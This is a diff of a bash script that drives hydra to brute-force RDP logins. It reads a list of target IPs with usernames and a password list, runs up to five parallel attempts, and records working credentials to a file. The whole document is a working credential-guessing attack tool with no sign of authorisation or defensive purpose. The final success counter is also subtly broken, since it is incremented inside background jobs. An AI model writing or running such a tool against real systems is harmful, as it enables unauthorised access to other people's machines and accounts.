@@ -1,89 +1,68 @@
 #!/bin/bash
 
-# Define the input files
+# Define input and output files
 iplog_file="iplog.txt"
 passwords_file="passwords.txt"
 success_log_file="successful_logins.txt"
 
 # Check if the input files exist
 if [[ ! -f "$iplog_file" || ! -f "$passwords_file" ]]; then
-    echo "One or both files do not exist, exiting."
+    echo -e "\e[31mOne or both files do not exist, exiting.\e[0m"
     exit 1
 fi
 
-# Create or clear the success log file
-> "$success_log_file"
-> "hydra_debug.log"  # Clear debug log
-
-# Read all RDP entries into an array
+# Read RDP entries and passwords
 mapfile -t iplog_entries < "$iplog_file"
-
-# Read all passwords into an array
 mapfile -t passwords < "$passwords_file"
 
-# Get the total number of attempts
-total_attempts=$(( ${#iplog_entries[@]} * ${#passwords[@]} ))
-current_attempt=0
 successful_attempts=0
-start_time=$(date +%s)
+total_passwords=${#passwords[@]}
 
-# Function to display progress
-display_progress() {
-    local elapsed_time=$1
-    local current_attempt=$2
-    local total_attempts=$3
-    local successful_attempts=$4
+# Function to attempt login
+attempt_login() {
+    local entry="$1"
+    local password="$2"
 
-    local percent=$(( (current_attempt * 100) / total_attempts ))
-    echo "Progress: $current_attempt / $total_attempts ($percent%)"
-    echo "Successful logins: $successful_attempts"
-    echo "Time elapsed: $(date -u -d @$elapsed_time +%H:%M:%S)"
+    # Parse the entry for IP and username
+    if [[ $entry =~ rdp://([^:]+):(.+) ]]; then
+        rdp_ip="${BASH_REMATCH[1]}"
+        username="${BASH_REMATCH[2]}"
+    else
+        echo "Invalid entry format: $entry"
+        return
+    fi
+
+    # Run hydra and capture the output
+    hydra_output=$(hydra -l "$username" -p "$password" "$rdp_ip" rdp -t 4 -W 3 2>&1)
+
+    # Check for specific success indicators in the output
+    if echo "$hydra_output" | grep -q "success"; then
+        echo "$(date '+%Y-%m-%d %H:%M:%S') - Successful login with $username on rdp://$rdp_ip using password: $password" >> "$success_log_file"
+        ((successful_attempts++))
+    fi
 }
 
-# Print initial static UI
-tput clear
-echo "Total Attempts: $total_attempts"
-echo "----------------------------------------"
-echo "Attempting logins..."
+# Loop through each password with line number
+for index in "${!passwords[@]}"; do
+    password="${passwords[index]}"
+    current_line=$((index + 1))
 
-# Loop through each password
-for password in "${passwords[@]}"; do
-    if [[ -z "$password" ]]; then continue; fi
+    echo -e "$(date '+%Y-%m-%d %H:%M:%S') - Currently checking password: $password (Line $current_line of $total_passwords)"
 
-    # Loop through each RDP entry in iplog.txt
     for entry in "${iplog_entries[@]}"; do
-        if [[ -z "$entry" ]]; then
-            echo "Invalid entry in iplog: '$entry', skipping..."
-            continue
-        fi
+        # Attempt login
+        attempt_login "$entry" "$password" &
 
-        username=$(echo "$entry" | cut -d':' -f2 | cut -d'@' -f1) # Adjust as per your entry format
-
-        # Run Hydra for each username and password pair, capturing output
-        hydra_output=$(sudo hydra -l "$username" -p "$password" "$entry" rdp -t 1 -W 5)
-        echo "$hydra_output" >> hydra_debug.log
-
-        if echo "$hydra_output" | grep -q "login successful"; then
-            echo "Successful login with $username on $entry using password: $password" >> "$success_log_file"
-            successful_attempts=$((successful_attempts + 1))
-        fi
-
-        # Update current attempt count
-        current_attempt=$((current_attempt + 1))
-        
-        # Introduce a delay based on the observed response time
-        sleep 3  # Keep it at 3 seconds
-
-        # Update elapsed time and display progress
-        elapsed_time=$(( $(date +%s) - start_time ))
-        display_progress "$elapsed_time" "$current_attempt" "$total_attempts" "$successful_attempts"
+        # Limit to 5 concurrent jobs to reduce load
+        while (( $(jobs -r -p | wc -l) >= 5 )); do
+            wait -n  # Wait for at least one job to finish
+        done
     done
 done
 
-# Final output
-elapsed_time=$(( $(date +%s) - start_time ))
-echo -ne "\n----------------------------------------\n"
-echo "Completed processing all entries in $iplog_file."
-echo "Total Attempts: $total_attempts"
-echo "Successful Logins: $(wc -l < $success_log_file)"
-echo "Time Used: $(date -u -d @$elapsed_time +%H:%M:%S)"
+# Wait for all background jobs to finish
+wait
+
+# Final report
+echo -e "\n\e[36m----------------------------------------\e[0m"
+echo -e "\e[36mTotal Successful Logins: \e[32m$successful_attempts\e[0m"
